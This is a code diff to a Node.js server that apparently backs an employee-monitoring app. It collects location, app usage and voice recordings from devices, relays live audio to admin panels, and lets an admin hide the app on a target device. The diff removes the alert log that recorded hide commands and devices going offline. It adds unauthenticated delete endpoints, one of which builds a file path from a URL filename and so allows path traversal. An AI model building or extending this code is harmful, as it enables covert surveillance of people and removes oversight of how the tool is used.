@@ -25,7 +25,6 @@ const employees    = new Map();   // employeeId → { info, socketId }
 const locationLogs = new Map();   // employeeId → [ ...events ]
 const appUsageLogs = new Map();   // employeeId → [ ...events ]
 const voiceLogs    = new Map();   // employeeId → [ ...filenames ]
-const alertsLog    = [];          // global alerts
 const hiddenApps   = new Map();   // employeeId → boolean
 
 // ─── Middleware ────────────────────────────────────────────────
@@ -84,13 +83,45 @@ app.get('/api/appusage/:empId', (req, res) => {
     res.json(result);
 });
 
+// App usage time-based history
+app.get('/api/appusage/:empId/history', (req, res) => {
+    const logs = appUsageLogs.get(req.params.empId) || [];
+    const from = parseInt(req.query.from) || 0;
+    const to   = parseInt(req.query.to)   || Date.now();
+
+    // Filter entries within time range
+    const filtered = logs.filter(e => {
+        const t = e.timestamp || new Date(e.receivedAt).getTime();
+        return t >= from && t <= to;
+    });
+
+    // Group by hour
+    const hourly = {};
+    filtered.forEach(e => {
+        const t = new Date(e.timestamp || e.receivedAt);
+        const hourKey = t.getFullYear() + '-' +
+            String(t.getMonth()+1).padStart(2,'0') + '-' +
+            String(t.getDate()).padStart(2,'0') + ' ' +
+            String(t.getHours()).padStart(2,'0') + ':00';
+
+        if (!hourly[hourKey]) hourly[hourKey] = {};
+        if (!hourly[hourKey][e.appName]) hourly[hourKey][e.appName] = { appName: e.appName, packageName: e.packageName, totalMs: 0 };
+        hourly[hourKey][e.appName].totalMs += e.usageMs;
+    });
+
+    // Convert to sorted array
+    const result = Object.entries(hourly)
+        .sort((a,b) => b[0].localeCompare(a[0]))
+        .map(([hour, apps]) => ({
+            hour,
+            apps: Object.values(apps).sort((a,b) => b.totalMs - a.totalMs)
+        }));
+    res.json(result);
+});
+
 app.get('/api/voice/:empId', (req, res) => {
     const files = voiceLogs.get(req.params.empId) || [];
     res.json(files.slice(-50).reverse()); // last 50
-});
-
-app.get('/api/alerts', (req, res) => {
-    res.json(alertsLog.slice(-100).reverse());
 });
 
 app.get('/api/stats', (req, res) => {
@@ -99,9 +130,55 @@ app.get('/api/stats', (req, res) => {
     res.json({
         totalEmployees: employees.size,
         onlineNow: onlineCount,
-        totalAlerts: alertsLog.length,
         totalVoiceFiles: [...voiceLogs.values()].reduce((s,a) => s + a.length, 0)
     });
+});
+
+// ─── DELETE Endpoints ──────────────────────────────────────────
+
+app.delete('/api/employees/:empId', (req, res) => {
+    const id = req.params.empId;
+    employees.delete(id);
+    locationLogs.delete(id);
+    appUsageLogs.delete(id);
+    voiceLogs.delete(id);
+    hiddenApps.delete(id);
+    // Delete audio files
+    const empAudioDir = path.join(AUDIO_DIR, id);
+    fs.remove(empAudioDir).catch(() => {});
+    io.emit('stats_update', getStats());
+    res.json({ success: true, message: `Employee ${id} and all data deleted` });
+});
+
+app.delete('/api/location/:empId', (req, res) => {
+    locationLogs.delete(req.params.empId);
+    res.json({ success: true, message: 'Location data deleted' });
+});
+
+app.delete('/api/appusage/:empId', (req, res) => {
+    appUsageLogs.delete(req.params.empId);
+    res.json({ success: true, message: 'App usage data deleted' });
+});
+
+app.delete('/api/voice/:empId', (req, res) => {
+    voiceLogs.delete(req.params.empId);
+    const empAudioDir = path.join(AUDIO_DIR, req.params.empId);
+    fs.remove(empAudioDir).catch(() => {});
+    io.emit('stats_update', getStats());
+    res.json({ success: true, message: 'Voice recordings deleted' });
+});
+
+app.delete('/api/voice/:empId/:filename', (req, res) => {
+    const { empId, filename } = req.params;
+    const files = voiceLogs.get(empId) || [];
+    const idx = files.findIndex(f => f.filename === filename);
+    if (idx !== -1) {
+        files.splice(idx, 1);
+        const filePath = path.join(AUDIO_DIR, empId, filename);
+        fs.remove(filePath).catch(() => {});
+    }
+    io.emit('stats_update', getStats());
+    res.json({ success: true, message: 'Voice recording deleted' });
 });
 
 // ─── Socket.IO ────────────────────────────────────────────────
@@ -123,7 +200,6 @@ io.on('connection', (socket) => {
 
         socket.employeeId = employeeId;
 
-        addAlert('info', `${employeeName} came online`, employeeId);
         io.emit('employee_status_change', { employeeId, employeeName, online: true });
         io.emit('stats_update', getStats());
     });
@@ -196,7 +272,8 @@ io.on('connection', (socket) => {
     // ── Real-time audio stream relay ──
     socket.on('audio_stream', (data) => {
         // Relay live audio to all admin panels
-        io.emit('audio_stream', data);
+        console.log(`Audio chunk from ${data.employeeId}, size=${data.audioChunk?.length || 0}`);
+        socket.broadcast.emit('audio_stream', data);
     });
 
     // ── App hidden status from device ──
@@ -204,16 +281,13 @@ io.on('connection', (socket) => {
         const { employeeId, hidden } = data;
         hiddenApps.set(employeeId, hidden);
         io.emit('app_hidden_changed', { employeeId, hidden });
-        addAlert('info', `App ${hidden ? 'hidden' : 'unhidden'} on device`, employeeId);
     });
 
     // ── Admin sends hide/unhide command ──
     socket.on('admin_hide_app', (data) => {
         const { employeeId, hide } = data;
-        // Forward to all connected sockets (the target device will filter by its own ID)
         io.emit('command_hide_app', { employeeId, hide });
         hiddenApps.set(employeeId, hide);
-        addAlert('info', `Admin ${hide ? 'hid' : 'unhid'} app for ${employeeId}`, employeeId);
         io.emit('app_hidden_changed', { employeeId, hidden: hide });
     });
 
@@ -224,7 +298,6 @@ io.on('connection', (socket) => {
             if (emp) {
                 emp.online   = false;
                 emp.lastSeen = new Date();
-                addAlert('warning', `${emp.info.employeeName} went offline`, socket.employeeId);
                 io.emit('employee_status_change', {
                     employeeId:   socket.employeeId,
                     employeeName: emp.info.employeeName,
@@ -239,19 +312,12 @@ io.on('connection', (socket) => {
 
 // ─── Helpers ──────────────────────────────────────────────────
 
-function addAlert(type, message, employeeId) {
-    alertsLog.push({ type, message, employeeId, timestamp: new Date() });
-    if (alertsLog.length > 500) alertsLog.splice(0, alertsLog.length - 500);
-    io.emit('new_alert', alertsLog[alertsLog.length - 1]);
-}
-
 function getStats() {
     let onlineCount = 0;
     employees.forEach(e => { if (e.online) onlineCount++; });
     return {
         totalEmployees: employees.size,
         onlineNow: onlineCount,
-        totalAlerts: alertsLog.length,
         totalVoiceFiles: [...voiceLogs.values()].reduce((s,a) => s + a.length, 0)
     };
 }
